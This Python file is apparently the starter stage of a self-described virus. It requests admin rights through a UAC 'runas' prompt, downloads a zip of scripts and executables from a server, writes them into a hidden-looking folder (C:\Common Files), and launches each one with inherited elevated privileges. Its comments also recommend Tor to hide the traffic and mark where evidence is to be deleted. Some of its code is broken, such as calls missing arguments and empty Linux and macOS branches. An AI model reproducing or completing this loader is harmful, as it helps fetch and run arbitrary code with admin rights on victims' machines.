# the script that makes everyhting work
import os # To interact with operating system
import sys # To interact with operating system
import ctypes # to get admin privileges
import requests # To download scripts
import subprocess # to launch scripts with admin privileges
from zipfile import ZipFile # to deal with zip files

ZIP_URL = 'http://127.0.0.1:8000/scripts'
ZIP_NAME = 'scripts.zip' # what the name of the zip containing the scripts should be called
TOR_INITIAL = True # whether the script should make the intial request through tor or the clearweb. Recommended True so you don't leak what you're doing to the router

scripts_paths = [] # the paths of the scripts
ovpn_path = ''

def check_admin(os):
    if os == 'win':
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False
    else:
        return os.getuid() == 0

def get_admin(os):
    if os == 'win':
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv[1:]), None, 1)
    sys.exit()

def get_scripts(): # downloads the scripts and puts them all in one place
    r = requests.get(ZIP_URL, headers={'os':sys.platform})
    with open(ZIP_NAME, 'wb') as zip:
        zip.write(r.content) # make the zip file from the recieved bits in the request
    with ZipFile(ZIP_NAME, 'r') as zip:
        scripts = zip.namelist() # get the list of files in the zip
        os.makedirs(scripts_direc, exist_ok=True) # make the directory for the scripts that were downloaded
        for script in scripts:
            with open(f"{scripts_direc}\\{script}", 'wb') as s:
                s.write(zip.read(script)) # put the contents of the file in the zip into the file you're making outside of the zip
                if '.ovpn' in script:
                    ovpn_path.join(f"{scripts_direc}\\{script}")
                else:
                    scripts_paths.append(f'{scripts_direc}\\{script}') # add the script and its path to the dictionary of script paths
                s.close()
        zip.close()
    os.remove(ZIP_NAME)

def start_scripts():
    for script in scripts_paths:
        if '.exe' in script:
            subprocess.Popen([script], shell = False) # start each script as a child process of the starter script so they inherit the admin privileges
        elif '.py' in script:
            print(script)
            subprocess.Popen(['python', script]) # start each script as a child process of the starter script so they inherit the admin privileges

if 'win' in sys.platform:
    scripts_direc = ('C:\\Common Files')  # the directory where the script will hide new files
    started_file = 'C:\\started.before'  # a file that is made after the initial launch to tell the starter that the scripts were already downloaded
    if not check_admin('win'):
        get_admin()
elif 'linux' in sys.platform:
    scripts_direc = ('')  # the directory where the script will hide new files
    started_file = ''  # a file that is made after the initial launch to tell the starter that the scripts were already downloaded
    check_admin('linux')
    get_admin()
elif 'darwin' in sys.platform:
    scripts_direc = ('')  # the directory where the script will hide new files
    started_file = ''  # a file that is made after the initial launch to tell the starter that the scripts were already downloaded
    check_admin('darwin')
    get_admin()
else:
    # -- delete all evidence of the virus --
    sys.exit() # stop the script

os.makedirs(scripts_direc, exist_ok=True) # make the directory for the scripts

if os.path.exists(started_file): # check if the starter has run before and if you just need to start the scripts or download them as well
    start_scripts()
else:
    get_scripts()
    with open(started_file, 'w') as f:
        f.close()
    print('starting scripts')
    start_scripts()